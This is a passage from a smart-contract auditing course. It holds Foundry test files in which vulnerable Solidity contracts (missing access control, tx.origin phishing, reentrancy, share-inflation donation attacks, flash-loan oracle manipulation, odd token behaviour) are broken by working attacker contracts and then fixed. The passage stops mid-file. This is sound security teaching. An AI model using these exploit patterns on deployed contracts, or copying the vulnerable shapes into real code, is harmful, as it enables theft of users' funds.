Start here: how to study this course

The course has 9 stages. Each stage begins with a short theory page in plain words, then the labs for that stage. Every lab has the same shape, so you always know where you are:

  1. In plain words: what the protocol does and the key terms.
  2. The cast: the contracts or accounts and what each does.
  3. The maths: formulas with a worked example and often a small calculator.
  4. Read the code: which files to open and what to look for.
  5. Hands-on: a test or script where you break something, then fix it.
  6. Find the bug: short snippets with answers hidden until you try.
  7. Study material: real incidents and reports to read.
  8. Checklist and deliverable: what to check next time, and what to write to prove you did the lab.

The nine stages in order

Perpetual futures and syntheticsLab 15, Lab 1610 hoursStage 4 (oracles, price impact) and Stage 2
Staking and restakingLab 17, Lab 18, Lab 19, Lab 20, Lab 2125 hoursStage 1 (shares) and Stage 2; Lab 21 also needs Lab 6
Yield productsLab 22, Lab 23, Lab 2415 hoursStage 4 (AMM), Stage 6 (shares), Stage 3 for Exponent
Cross-chain messagingLab 25, Lab 26, Lab 2715 hoursStages 1, 3 and 4

Time is a rough guide at 4 to 6 hours per protocol lab. Total about 140 hours, or 18 weeks at 8 hours a week.

Study habits that make it work

  • Before you read a lab's code, do its worked example by hand and compare with the calculator.
  • Run every exploit test, then fix it and watch it fail. Seeing both is the lesson.
  • Write the deliverable. A finding you can state clearly (title, impact, likelihood, proof, fix) is the skill an employer or contest judge looks for.
  • Verify claims. Names, addresses and figures here may be wrong or out of date; each lab tells you what to check.
  • Keep a notebook of bug classes (see the capstone table) and add one line each time you meet a bug.

Stage 0: Orientation

About 2 hours of study · needs: nothing

Theory in plain words

A smart-contract audit asks one question: can anyone make this system do something its owners and users did not intend, especially move value? To answer it you need three things. A threat model: who can call what, who is trusted, and what the attacker controls. A list of invariants: plain statements that must always be true, such as 'total shares match total assets' or 'nobody can withdraw more than they put in plus earnings'. And evidence: a test that breaks an invariant, or a clear argument that none can be broken.

Bugs live in three layers. Code errors (a wrong check, wrong rounding). Design errors (the code does what was intended, but the rules allow an attack). Operational risk (who holds the keys, who can upgrade). Automated scanners find a small part of the first layer. Most expensive losses sit in the second and third, which is why this course teaches you to read designs, not just code.

Check yourself before moving on
  1. Name the three layers where bugs live and give one example of each.
  2. Write one invariant for a contract you have read.

How this course works

You learn auditing by breaking code, not by reading descriptions. Every lesson has the same loop: read vulnerable code → predict the bug → write the exploit test → fix it → re-run the test. Protocol chapters (Aave, Uniswap, ...) come later and reuse these skills: each becomes a lab where you read the real code and hunt for the same bug patterns.

StageYou will be able to

M0. Setup and how to read a contract

In plain wordsBefore you can find bugs you must read code in a methodical way. This module sets up your tools and gives you a four-step routine: map the contracts, follow the money, check what is trusted, and state the rule that must always hold.

Key terms: invariant, entry point, trust boundary. See the glossary at the end.

Install your tools (10 minutes)

Do this 
curl -L https://foundry.paradigm.xyz | bash
foundryup
forge init audit-lab && cd audit-lab
forge test -vvv        # should show 1 passing test
Every code block below goes into src/ (contracts) or test/ (tests). Run with forge test -vvv.

The 4-pass reading method

  1. Map: list contracts, who holds funds, the external/public functions. These are your attack entry points.
  2. Money flow: for each function, write "tokens/ETH in, tokens/ETH out, state changed".
  3. Trust: who can call it? What outside data does it believe (price, caller, token behaviour)?
  4. Invariants: write one sentence that must always be true, then try to break it.

Practice: read this vault

contract Vault {
    mapping(address => uint) public bal;
    function deposit() external payable { bal[msg.sender] += msg.value; }
    function withdraw(uint amt) external {
        require(bal[msg.sender] >= amt);
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok);
        bal[msg.sender] -= amt;
    }
}
Answer: map, flow, trust, invariant

Map: deposit, withdraw; ETH sits in the contract. Flow: deposit adds ETH and credits the sender; withdraw sends ETH then reduces the credit. Trust: msg.sender may be a contract, and .call hands control to it. Invariant: sum(bal) == address(this).balance. The order in withdraw already smells wrong: that is bug #2 in M1.

Stage 1: Core vulnerabilities and maths

About 8 hours of study · needs: Stage 0

Theory in plain words

Four facts explain most DeFi bugs. (1) Every public function is an open door: the caller chooses the inputs. (2) Contracts hold real money, so a logic error is a payout. (3) Calls are not isolated: when you call another contract, it can call you back before you have finished, or read your half-updated state (reentrancy). (4) Computers store whole numbers, so every division throws away a remainder and somebody must decide who benefits.

Shares are the standard answer to 'how do we track many users cheaply'. The pool stores one total and each user's fraction of it, so when the pool earns interest every holder's value rises without touching their record. Shares work only if the total is trustworthy: if someone can distort the total (a donation) or the rounding favours the user, value leaks. The rounding rule you will use all course: round so the pool never pays out more, or charges less, than the exact maths says.

Check yourself before moving on
  1. Why should a deposit mint slightly fewer shares when the maths does not divide exactly?
  2. Explain the donation attack in two sentences.

M1. Six core vulnerabilities, with working exploits

In plain wordsSix kinds of mistake explain most real losses in smart contracts: anyone can call a sensitive function, a contract is called back before it has finished, a share price can be distorted, a price can be pushed within one transaction, tokens do not behave as assumed, whole-number maths goes wrong, plus a table of older classics. For each of the six you will read vulnerable code, run an exploit that works, apply the fix, and run a test that proves the fix.

Key terms: access control, reentrancy, share inflation, oracle, flash loan, rounding. See the glossary at the end.

How to use this module. Every bug follows the same six steps: what it is, why it happens, a real case, vulnerable code with an exploit that works, the fix, and how to spot it when you read someone else's code. Do them in order; the later bugs reuse the habits of the earlier ones. Plan about three hours.

Setup (10 minutes)Install Foundry (M0 covers installation), run forge init audit-lab, then copy each code block below into its own file under test/ (the file name is given above each block). The blocks are self-contained: contracts and tests live in one file, so you do not need anything in src/. Every test in this module was run with Foundry 1.5.1 and solc 0.8.26 and passes as shown. 
forge test --match-contract M1 -vv        # run every test in this module
forge test --match-test test_zeroShapeDrained -vvvv   # one test, with a full call trace

How an attacker thinks

A vulnerability is an assumption an attacker can make false. Every contract is full of silent assumptions: "only the owner calls this", "the balance I read is what I was sent", "this price is fair", "nothing else runs while I update my records". Auditing is the habit of writing each assumption down and asking: who controls the thing I am assuming, and what happens if they lie?

What an attacker can doWhat an attacker cannot do
Call any public function, with any arguments, as many times as they like, in any order, from an account or from their own contractBreak the cryptography or forge another account's signature
Use huge temporary capital through a flash loan (repaid in the same transaction)Change another contract's storage directly
Deploy their own tokens, oracles, pools and callbacks, and pass them to your contractSkip paying gas, or keep a transaction that reverts
See pending transactions and insert their own before or after (front-running)Read nothing: all contract storage is public

The anatomy of a finding

Whatever the bug, you describe it with the same six parts. Fill them in before you write anything else:

PartQuestion it answersExample (the reentrancy vault)
Root causeWhich assumption is false?"State is updated after the ETH is sent, so the balance is stale during the callback"
PreconditionsWhat must be true first?Attacker holds a deposit; vault holds other users' ETH
StepsThe exact call sequencedeposit 1 ETH, call withdrawAll, re-enter from receive(), repeat
ImpactWhat is lost, and how much?All ETH in the vault
FixThe smallest change that removes the false assumptionZero the balance before the call; add a lock
ProofA test that fails after the fixtest_zeroShapeDrained and test_safeVaultBlocksReentry

Severity, and two Foundry habits

Likelihood: low (hard, rare)Likelihood: mediumLikelihood: high (anyone, now)
Impact: high (funds lost or frozen)MediumHighCritical
Impact: medium (some funds or a core feature)LowMediumHigh
Impact: low (annoyance, dust)InformationalLowLow
Two Foundry habits that save hours (1) vm.prank, vm.expectRevert and similar cheatcodes apply to the very next call, and that includes calls made while evaluating the arguments of the call you meant. vm.prank(a); v.redeem(v.sharesOf(a)) makes sharesOf the pranked call. Compute arguments first, then prank. I made this mistake twice while writing this module. (2) A test passing proves nothing if it can never fail: always run the exploit against the fixed version and watch it fail.

Bug 1: Missing access control

What it is. A function that changes something important can be called by someone who should not be able to call it.

Why it happens. In Solidity every public or external function is open to the world unless you add a check. The check is easy to forget, to put on the wrong function, or to base on the wrong identity.

FormExample
No check at allsetPrice(uint) with no require
Initialiser anyone can call (again)initialize(owner) with no "already done" guard, common in upgradeable contracts
Wrong identitytx.origin instead of msg.sender
Too much powerOne address can drain or change everything (a key-management risk, not a code bug)

A real case. In July 2017 the Parity multisig wallet lost roughly $30 million because an initialisation function could be called by anyone. In November the same family of wallets, which shared one library contract, had roughly $150 million frozen when a user called another unprotected function on that library and destroyed it. (Figures are approximate and from memory.)

The code. Three vulnerable contracts, their fixed twins, and five tests. File test/M1Access.t.sol:

pragma solidity ^0.8.20;
import "forge-std/Test.sol";

// 1a. A sensitive setter with no caller check
contract PriceOracle {
    uint public price = 2000;
    function setPrice(uint p) external { price = p; }              // anyone can call
}
contract PriceOracleFixed {
    address public owner = msg.sender;
    uint public price = 2000;
    function setPrice(uint p) external { require(msg.sender == owner, "not owner"); price = p; }
}

// 1b. An initializer that can be called again, by anyone
contract Treasury {
    address public owner; bool public initialised;
    function initialize(address _owner) external { owner = _owner; initialised = true; }
    function sweep(address payable to) external { require(msg.sender == owner, "not owner"); to.transfer(address(this).balance); }
    receive() external payable {}
}
contract TreasuryFixed {
    address public owner; bool public initialised;
    function initialize(address _owner) external { require(!initialised, "already initialised"); initialised = true; owner = _owner; }
    function sweep(address payable to) external { require(msg.sender == owner, "not owner"); to.transfer(address(this).balance); }
    receive() external payable {}
}

// 1c. Authorising with tx.origin instead of msg.sender
contract OriginWallet {
    address public owner = msg.sender;
    function send(address payable to, uint amt) external { require(tx.origin == owner, "not owner"); to.transfer(amt); }
    receive() external payable {}
}
contract Phisher {
    OriginWallet w; address payable boss;
    constructor(OriginWallet _w) { w = _w; boss = payable(msg.sender); }
    function claimPrize() external { w.send(boss, address(w).balance); }   // the victim thinks this is a harmless call
}

contract M1AccessTest is Test {
    address attacker = address(0xBAD); address owner = address(0xA11CE);

    function test_anyoneSetsPrice() public {
        PriceOracle o = new PriceOracle();
        vm.prank(attacker); o.setPrice(1);
        assertEq(o.price(), 1);
    }
    function test_fixedOracleRejects() public {
        PriceOracleFixed o = new PriceOracleFixed();
        vm.prank(attacker); vm.expectRevert("not owner"); o.setPrice(1);
    }
    function test_reinitialiseTakesOver() public {
        vm.prank(owner); Treasury t = new Treasury();
        vm.prank(owner); t.initialize(owner);
        vm.deal(address(t), 10 ether);
        vm.prank(attacker); t.initialize(attacker);            // second call, by the attacker
        vm.prank(attacker); t.sweep(payable(attacker));
        assertEq(attacker.balance, 10 ether);
    }
    function test_fixedInitialiseOnce() public {
        TreasuryFixed t = new TreasuryFixed();
        t.initialize(owner);
        vm.prank(attacker); vm.expectRevert("already initialised"); t.initialize(attacker);
    }
    function test_txOriginPhishing() public {
        vm.prank(owner); OriginWallet w = new OriginWallet();
        vm.deal(address(w), 10 ether);
        vm.prank(attacker); Phisher p = new Phisher(w);
        vm.prank(owner, owner);                                // msg.sender and tx.origin are both the owner
        p.claimPrize();                                        // owner is tricked into calling the attacker's contract
        assertEq(attacker.balance, 10 ether);
    }
}

What each test proves. test_anyoneSetsPrice: a stranger changes the price. test_reinitialiseTakesOver: the owner initialised the treasury correctly, and the attacker simply initialises it again and sweeps it. test_txOriginPhishing: the owner is tricked into calling the attacker's contract; because tx.origin is still the owner, the wallet obeys. The two Fixed tests show the same calls now revert.

The fix. Check msg.sender against a stored owner or role; make initialisation one-shot; for upgradeable contracts also disable initialisation on the implementation contract; use two-step ownership transfer so a typo cannot lock you out; keep the number of privileged addresses small and put them behind a multisig and a timelock.

How to spot it. Build a table, one row per external function:

FunctionChanges state or moves value?Who should be allowed?Where is it enforced?
setPriceYes: sets the priceOwner onlyNowhere: finding
price (getter)NoAnyonen/a

Any row with "changes state" and "nowhere" is a finding. A quick search helps: grep -nE "function .*(external|public)" src/*.sol, then read each result. Also read every internal function that a public one calls: the check may be missing in the wrapper.

Check yourself1. Why can an attacker call initialize on a contract that was already deployed and used? 2. Why is require(tx.origin == owner) unsafe even though only the owner can start a transaction?

Bug 2: Reentrancy

What it is. Your function makes an external call (sending ETH, calling a token, calling a callback). The other side runs code and calls back into your contract before your function has finished updating its records. It then sees old numbers.

Why it happens. Developers write "check, send, then update" because it reads naturally. The send hands control to untrusted code. Anything that calls out is a doorway: ETH sends (the receiver's receive() runs), ERC-777 and ERC-1155 hooks, ERC-721 safeTransferFrom, flash-loan callbacks, and your own calls to other protocols.

What happens, step by step (the ZeroVault below, holding 5 ETH of other users plus the attacker's 1 ETH):

attacker.attack()
 ├─ vault.deposit(1 ETH)               balance[attacker] = 1
 └─ vault.withdrawAll()                reads amt = 1       (balance still 1)
     ├─ sends 1 ETH ──► attacker.receive()
     │    └─ vault.withdrawAll()        reads amt = 1  AGAIN, balance not yet zeroed
     │         ├─ sends 1 ETH ──► attacker.receive()
     │         │    └─ ...             repeats while the vault holds ETH (6 times)
     │         └─ balance[attacker] = 0
     └─ balance[attacker] = 0
A correction you should know about. An earlier version of this course used a vault that ends with balance -= amount and said the attack drains it. On Solidity 0.8 that is false: when the nested calls unwind, the second subtraction underflows and the whole transaction reverts. test_subShapeRevertsOn08 below proves it. Do not conclude that this shape is safe: attackers use shapes where the record is overwritten (= 0), or re-enter a different function that reads the stale record (cross-function), or read an inconsistent value from outside (read-only reentrancy, Labs 12 and 13). Running the code found the error; the lesson is that an exploit you have not run is a hypothesis.
TypeWhat is re-entered
Single-functionThe same function (needs a shape where it does not underflow)
Cross-functionA different function sharing the stale state (transferTo in the example)
Cross-contractAnother contract of the same system reading state you have not finished writing
Read-onlyA view function read by a third protocol during the callback

Real cases. The DAO, June 2016: about $60 million of ETH, which led to the Ethereum hard fork. Lendf.me, April 2020: about $25 million through ERC-777 hooks. Cream Finance, August 2021: about $18 million through token callbacks. (Approximate, from memory.)

The code. File test/M1Reentrancy.t.sol:

pragma solidity ^0.8.20;
import "forge-std/Test.sol";

interface IBank { function deposit() external payable; function withdrawAll() external; function balanceOf(address) external view returns (uint); }

// Shape 1: "bal -= amt" after the external call
contract SubVault {
    mapping(address => uint) public bal;
    function deposit() external payable { bal[msg.sender] += msg.value; }
    function withdraw(uint amt) external {
        require(bal[msg.sender] >= amt);
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok);
        bal[msg.sender] -= amt;
    }
}
// Shape 2: "bal = 0" after the external call
contract ZeroVault is IBank {
    mapping(address => uint) public balanceOf;
    function deposit() external payable { balanceOf[msg.sender] += msg.value; }
    function withdrawAll() external {
        uint amt = balanceOf[msg.sender];
        require(amt > 0, "nothing");
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok, "send failed");
        balanceOf[msg.sender] = 0;                             // effect AFTER the interaction
    }
}
// Fixed: checks, effects, interactions + a lock
contract SafeVault is IBank {
    mapping(address => uint) public balanceOf; uint private _lock = 1;
    modifier nonReentrant() { require(_lock == 1, "reentrant"); _lock = 2; _; _lock = 1; }
    function deposit() external payable { balanceOf[msg.sender] += msg.value; }
    function withdrawAll() external nonReentrant {
        uint amt = balanceOf[msg.sender];
        require(amt > 0, "nothing");
        balanceOf[msg.sender] = 0;                             // effect first
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok, "send failed");
    }
}
contract SubAttacker {
    SubVault v; constructor(SubVault _v) { v = _v; }
    function attack() external payable { v.deposit{value: 1 ether}(); v.withdraw(1 ether); }
    receive() external payable { if (address(v).balance >= 1 ether) v.withdraw(1 ether); }
}
contract Reenterer {
    IBank v; constructor(IBank _v) { v = _v; }
    function attack() external payable { v.deposit{value: 1 ether}(); v.withdrawAll(); }
    receive() external payable { if (address(v).balance >= 1 ether) v.withdrawAll(); }
}
// Cross-function: re-enter a DIFFERENT function that still sees the stale balance
contract Bank {
    mapping(address => uint) public balanceOf;
    function deposit() external payable { balanceOf[msg.sender] += msg.value; }
    function transferTo(address to, uint a) external { require(balanceOf[msg.sender] >= a); balanceOf[msg.sender] -= a; balanceOf[to] += a; }
    function withdrawAll() external {
        uint amt = balanceOf[msg.sender]; require(amt > 0);
        (bool ok,) = msg.sender.call{value: amt}(""); require(ok);
        balanceOf[msg.sender] = 0;
    }
}
contract Accomplice { function cash(Bank b) external { b.withdrawAll(); } receive() external payable {} }
contract CrossAttacker {
    Bank b; Accomplice acc; bool done;
    constructor(Bank _b, Accomplice _a) { b = _b; acc = _a; }
    function attack() external payable { b.deposit{value: 1 ether}(); b.withdrawAll(); }
    receive() external payable { if (!done) { done = true; b.transferTo(address(acc), 1 ether); } }
}

contract M1ReentrancyTest is Test {
    function test_subShapeRevertsOn08() public {
        SubVault v = new SubVault(); v.deposit{value: 5 ether}();
        SubAttacker a = new SubAttacker(v);
        vm.expectRevert();                                     // underflow when the nested calls unwind
        a.attack{value: 1 ether}();
    }
    function test_zeroShapeDrained() public {
        ZeroVault v = new ZeroVault(); v.deposit{value: 5 ether}();
        Reenterer a = new Reenterer(v);
        a.attack{value: 1 ether}();
        assertEq(address(v).balance, 0);
        assertEq(address(a).balance, 6 ether);                 // 1 of its own + 5 stolen
    }
    function test_crossFunction() public {
        Bank b = new Bank(); b.deposit{value: 5 ether}();
        Accomplice acc = new Accomplice(); CrossAttacker a = new CrossAttacker(b, acc);
        a.attack{value: 1 ether}();
        acc.cash(b);
        assertEq(address(a).balance + address(acc).balance, 2 ether);   // one deposited, two withdrawn
    }
    function test_safeVaultBlocksReentry() public {
        SafeVault v = new SafeVault(); v.deposit{value: 5 ether}();
        Reenterer a = new Reenterer(v);
        vm.expectRevert();
        a.attack{value: 1 ether}();
    }
}

What each test proves. test_subShapeRevertsOn08: the naive shape fails on 0.8. test_zeroShapeDrained: the vault ends with 0 and the attacker contract with 6 ETH (its own 1 plus 5 stolen). test_crossFunction: during the callback the attacker moves its still-recorded balance to an accomplice, then the original call zeroes the attacker's record; the accomplice cashes out. One ETH deposited, two ETH withdrawn. test_safeVaultBlocksReentry: the fixed vault makes the same attack revert.

The fix. Use checks, effects, interactions: validate, then update every record, and only then call out. Add a nonReentrant lock on every function that touches shared state (a lock on one function does not stop cross-function attacks on another). Prefer pull payments (let users withdraw) over pushing ETH in loops. For read-only reentrancy, make view functions that other protocols rely on refuse to answer while a lock is held.

How to spot it. For every external call in the code, write down (1) what is written to storage after it and (2) which other functions read that storage. If the answer to (1) is not "nothing", you have a candidate.

Check yourself1. Why does withdrawAll with = 0 after the call drain the vault but withdraw(amt) with -= amt does not? 2. Name three things other than sending ETH that can hand control to an attacker.

Bug 3: Share inflation (donation attack)

What it is. A vault gives out shares in proportion to what you deposit. If the share price can be pushed very high while almost no shares exist, a later depositor's shares round down to zero and the attacker takes their money.

Why it happens. Share maths is shares = assets × totalShares / totalAssets, rounded down. If totalAssets is read from the token balance, anyone can raise it by transferring tokens straight to the vault (a donation), without minting shares.

StepVault assetsTotal sharesWhat happened
Attacker deposits 111First deposit, 1 share per unit
Attacker donates 10,00010,0011Price per share is now 10,001
Victim deposits 10,00020,0011shares = 10,000 × 1 / 10,001 = 0.9999, rounded down to 0
Attacker redeems 1 share00Takes all 20,001. Spent 10,001, gained 10,000

Real cases. The pattern has hit several ERC-4626 vaults and lending-market forks, and it is why OpenZeppelin's ERC-4626 uses virtual shares, Uniswap V2 locks the first 1,000 shares, and Morpho tracks assets in storage. The Resupply exploit of 2025 (roughly $10 million, from memory) is a recent example of a manipulated vault exchange rate.

The code. A naive vault, two fixes, and three tests. File test/M1Inflation.t.sol:

pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract Token {
    mapping(address => uint) public balanceOf;
    function mint(address to, uint a) external { balanceOf[to] += a; }
    function transfer(address to, uint a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
    function transferFrom(address f, address to, uint a) external returns (bool) { balanceOf[f] -= a; balanceOf[to] += a; return true; }
}
// total assets = the token balance of the vault, so a direct transfer ("donation") changes the share price
contract NaiveVault {
    Token public t; uint public totalShares; mapping(address => uint) public sharesOf;
    constructor(Token _t) { t = _t; }
    function totalAssets() public view returns (uint) { return t.balanceOf(address(this)); }
    function deposit(uint assets) external virtual returns (uint shares) {
        shares = totalShares == 0 ? assets : assets * totalShares / totalAssets();
        t.transferFrom(msg.sender, address(this), assets);
        totalShares += shares; sharesOf[msg.sender] += shares;
    }
    function redeem(uint shares) external returns (uint assets) {
        assets = shares * totalAssets() / totalShares;
        sharesOf[msg.sender] -= shares; totalShares -= shares;
        t.transfer(msg.sender, assets);
    }
}
// Fix 1: refuse a deposit that mints zero shares
contract MinSharesVault is NaiveVault {
    constructor(Token _t) NaiveVault(_t) {}
    function deposit(uint assets) external override returns (uint shares) {
        shares = totalShares == 0 ? assets : assets * totalShares / totalAssets();
        require(shares > 0, "zero shares");
        t.transferFrom(msg.sender, address(this), assets);
        totalShares += shares; sharesOf[msg.sender] += shares;
    }
}
// Fix 2: virtual shares and assets (the idea used by OpenZeppelin ERC-4626 and Morpho)
contract VirtualVault is NaiveVault {
    uint constant OFFSET = 1000;
    constructor(Token _t) NaiveVault(_t) {}
    function deposit(uint assets) external override returns (uint shares) {
        shares = assets * (totalShares + OFFSET) / (totalAssets() + 1);
        t.transferFrom(msg.sender, address(this), assets);
        totalShares += shares; sharesOf[msg.sender] += shares;
    }
    function redeemV(uint shares) external returns (uint assets) {
        assets = shares * (totalAssets() + 1) / (totalShares + OFFSET);
        sharesOf[msg.sender] -= shares; totalShares -= shares;
        t.transfer(msg.sender, assets);
    }
}

contract M1InflationTest is Test {
    Token t; address attacker = address(0xBAD); address victim = address(0x71C);
    function setUp() public { t = new Token(); t.mint(attacker, 10_001); t.mint(victim, 10_000); }

    function test_attackOnNaiveVault() public {
        NaiveVault v = new NaiveVault(t);
        vm.startPrank(attacker); v.deposit(1); t.transfer(address(v), 10_000); vm.stopPrank();   // 1 wei of shares, then a donation
        vm.prank(victim); uint got = v.deposit(10_000);
        assertEq(got, 0);                                      // victim gets nothing
        vm.prank(attacker); uint out = v.redeem(1);
        assertEq(out, 20_001);                                 // attacker spent 10,001 and takes 20,001
    }
    function test_minSharesBlocksVictimLoss() public {
        MinSharesVault v = new MinSharesVault(t);
        vm.startPrank(attacker); v.deposit(1); t.transfer(address(v), 10_000); vm.stopPrank();
        vm.prank(victim); vm.expectRevert("zero shares"); v.deposit(10_000);
    }
    function test_virtualSharesMakeItUnprofitable() public {
        VirtualVault v = new VirtualVault(t);
        vm.startPrank(attacker); v.deposit(1); t.transfer(address(v), 10_000); vm.stopPrank();
        vm.prank(victim); uint got = v.deposit(10_000);
        vm.prank(victim); uint vOut = v.redeemV(got);
        uint aShares = v.sharesOf(attacker);
        vm.prank(attacker); uint aOut = v.redeemV(aShares);
        emit log_named_uint("victim shares", got); emit log_named_uint("victim gets back", vOut); emit log_named_uint("attacker gets back", aOut);
        assertLt(aOut, 10_001);                                // attacker loses money
        assertGe(vOut, 9_990);                                 // victim loses almost nothing
    }
}

What the tests show, with the numbers I got when I ran them:

VersionVictimAttacker
Naive vault0 shares, loses all 10,000Spends 10,001, collects 20,001: +10,000
Reject zero sharesThe deposit reverts: nothing lostLoses the 10,000 donation (a griefing cost)
Virtual shares (offset 1,000)1,999 shares, gets back 9,998: loses 2Gets back 5,002 for 10,001: loses 4,999

Fix menu. (1) Keep totalAssets in storage and update it only through deposits, withdrawals and reported interest, never from balanceOf. (2) Add virtual shares and assets, so the share price cannot jump. (3) Lock a minimum number of shares at the first deposit. (4) Revert when a deposit would mint zero shares (or a withdrawal would return zero assets). (5) For a new vault, let the deployer make a meaningful first deposit. Use several of these together.

How to spot it. Search the share maths for balanceOf(address(this)). Check what happens when totalShares is 0 and when it is tiny. Check that a zero result is rejected. The empty-again case (everyone withdrew) is as dangerous as the first deposit.

Check yourself1. Why does the donation not need to mint shares for the attacker? 2. Why does the attacker lose money against the virtual-shares vault even though their share of the vault is large?

Bug 4: Oracle manipulation

What it is. A protocol needs a price and reads it from a source an attacker can move within one transaction, for example the current reserves of an exchange pool.

Why it happens. The pool price looks like a fair market price, and on average it is: arbitrage keeps it close to the market. But a flash loan lets an attacker borrow huge capital for the span of one transaction, push the pool price, use it, push it back, and repay.

Price sourceCost to manipulateMain risks
Spot pool priceVery low (flash loan)Never use as a collateral or settlement price
Time-weighted average (TWAP)High, grows with window length and pool depthLag; thin pools; window too short
Chainlink-style feedAttack the data providers (hard)Stale price, wrong decimals, feed paused or deprecated
Your own protocol's number (share price, LP price)Depends: often a donationSee Bug 3 and Labs 12 and 13

The attack with numbers. Pool: 1,000 ETH and 2,000,000 USD, so 1 ETH = 2,000 USD. A lender allows borrowing 75% of collateral value at the pool's price. The attacker has 10 ETH of collateral, worth 20,000 USD, so the honest limit is 15,000.

  1. Flash-borrow 2,000,000 USD and buy ETH: the pool now has 500 ETH and 4,000,000 USD, so the price is 8,000.
  2. Deposit 10 ETH: the lender now values it at 80,000 USD and allows a loan of 60,000.
  3. Borrow 60,000 USD.
  4. Sell the ETH back; the pool returns to 2,000, the flash loan is repaid.

The attacker keeps 60,000 USD and leaves 10 ETH worth 20,000 behind: 40,000 of bad debt for the lender. Real costs (0.3% pool fee each way on 2M, about 12,000, plus a flash-loan fee, about 1,000) leave a profit of roughly 27,000 USD. File test/M1Oracle.t.sol (the pool and lender hold only numbers; no tokens move, so what is simulated is the price path):

pragma solidity ^0.8.20;
import "forge-std/Test.sol";

// A tiny constant-product pool: 1,000 ETH and 2,000,000 USD, so 1 ETH = 2,000 USD
contract ToyPool {
    uint public rE = 1000e18; uint public rU = 2_000_000e18;
    function price() public view returns (uint) { return rU * 1e18 / rE; }          // USD per ETH, 1e18 scale
    function buyE(uint uIn) external returns (uint eOut) { eOut = rE * uIn / (rU + uIn); rU += uIn; rE -= eOut; }
    function sellE(uint eIn) external returns (uint uOut) { uOut = rU * eIn / (rE + eIn); rE += eIn; rU -= uOut; }
}
// A lender that values collateral at the pool's current price
contract SpotLender {
    ToyPool pool; uint public liquidityU = 500_000e18;
    mapping(address => uint) public collE; mapping(address => uint) public debtU;
    constructor(ToyPool p) { pool = p; }
    function deposit(uint e) external { collE[msg.sender] += e; }
    function borrow(uint u) external {
        require(collE[msg.sender] * pool.price() / 1e18 * 75 / 100 >= debtU[msg.sender] + u, "undercollateralised");
        debtU[msg.sender] += u; liquidityU -= u;
    }
}
// The same lender with an external price (stand-in for a Chainlink feed or a long TWAP)
contract FeedLender {
    uint public feedPrice = 2000e18; uint public liquidityU = 500_000e18;
    mapping(address => uint) public collE; mapping(address => uint) public debtU;
    function deposit(uint e) external { collE[msg.sender] += e; }
    function borrow(uint u) external {
        require(collE[msg.sender] * feedPrice / 1e18 * 75 / 100 >= debtU[msg.sender] + u, "undercollateralised");
        debtU[msg.sender] += u; liquidityU -= u;
    }
}

contract M1OracleTest is Test {
    function test_flashLoanMovesTheSpotPrice() public {
        ToyPool pool = new ToyPool(); SpotLender l = new SpotLender(pool);
        address atk = address(0xBAD);
        vm.startPrank(atk);
        uint e = pool.buyE(2_000_000e18);                      // 1) flash-borrow 2M USD and buy ETH
        emit log_named_uint("price after the buy", pool.price() / 1e18);
        l.deposit(10e18);                                      // 2) post 10 ETH as collateral
        l.borrow(60_000e18);                                   // 3) borrow against the inflated price
        pool.sellE(e);                                         // 4) sell the ETH back, repay the flash loan
        vm.stopPrank();
        emit log_named_uint("price after the sell", pool.price() / 1e18);
        assertEq(l.debtU(atk), 60_000e18);                     // 60,000 borrowed against 10 ETH worth 20,000
        assertEq(pool.price(), 2000e18);                       // the pool looks untouched afterwards
    }
    function test_feedBasedLenderRefuses() public {
        FeedLender l = new FeedLender();
        l.deposit(10e18);
        vm.expectRevert("undercollateralised");
        l.borrow(60_000e18);                                   // 10 ETH at 2,000 allows at most 15,000
    }
}

The fix. Take the price from a feed or a long TWAP that one transaction cannot move (the second test shows the same loan reverting). With Chainlink-style feeds also check: the answer is positive, the update is recent (compare with the feed's heartbeat), decimals are handled, on L2s the sequencer is up, and the price is inside sane bounds with a defined behaviour when it is not. Limit the damage too: caps per asset, and lower loan-to-value for thin markets.

How to spot it. For every price, rate or exchange value the code reads, ask: who can change this within one transaction, and what does it cost compared with what it earns? Red flags: getReserves, balanceOf used as a price, totalAssets / totalSupply used as a price, slot0.

Check yourself1. Why does the attacker end with the same pool price they started with, and why does that make the attack hard to see afterwards? 2. Why does a longer TWAP window raise the attacker's cost?

Bug 5: Token surprises

What it is. The code assumes a token behaves like the textbook ERC-20 and it does not.

BehaviourExampleWhat breaks
Fee on transferSome tax tokensYou receive less than the amount you were told
No return valueUSDT on EthereumA call expecting a bool reverts
Rebasing balancestETH, AMPLStored balances go out of date
Hooks on transferERC-777Reentrancy (Bug 2)
Can block or pause accountsUSDC, USDTA transfer to or from your contract reverts
Not 18 decimalsUSDC 6, WBTC 8Maths is off by powers of ten
Upgradeable or mintableMany stablecoinsBehaviour can change after you integrate

The code. A fee token, a no-return token, a naive and a careful deposit contract. File test/M1Tokens.t.sol:

pragma solidity ^0.8.20;
import "forge-std/Test.sol";

interface IERC20 {
    function transfer(address, uint) external returns (bool);
    function transferFrom(address, address, uint) external returns (bool);
    function balanceOf(address) external view returns (uint);
}
// Takes a 1% fee on every transfer
contract FeeToken {
    mapping(address => uint) public balanceOf;
    function mint(address to, uint a) external { balanceOf[to] += a; }
    function transfer(address to, uint a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a * 99 / 100; return true; }
    function transferFrom(address f, address to, uint a) external returns (bool) { balanceOf[f] -= a; balanceOf[to] += a * 99 / 100; return true; }
}
// Like USDT: transfer returns nothing at all
contract NoReturnToken {
    mapping(address => uint) public balanceOf;
    function mint(address to, uint a) external { balanceOf[to] += a; }
    function transfer(address to, uint a) external { balanceOf[msg.sender] -= a; balanceOf[to] += a; }
}
contract NaiveDeposits {
    IERC20 t; uint public totalCredit; mapping(address => uint) public credit;
    constructor(IERC20 _t) { t = _t; }
    function deposit(uint amt) external { t.transferFrom(msg.sender, address(this), amt); credit[msg.sender] += amt; totalCredit += amt; }
}
contract CarefulDeposits {
    IERC20 t; uint public totalCredit; mapping(address => uint) public credit;
    constructor(IERC20 _t) { t = _t; }
    function deposit(uint amt) external {
        uint before = t.balanceOf(address(this));
        t.transferFrom(msg.sender, address(this), amt);
        uint got = t.balanceOf(address(this)) - before;        // credit what actually arrived
        credit[msg.sender] += got; totalCredit += got;
    }
}
library SafeTransfer {
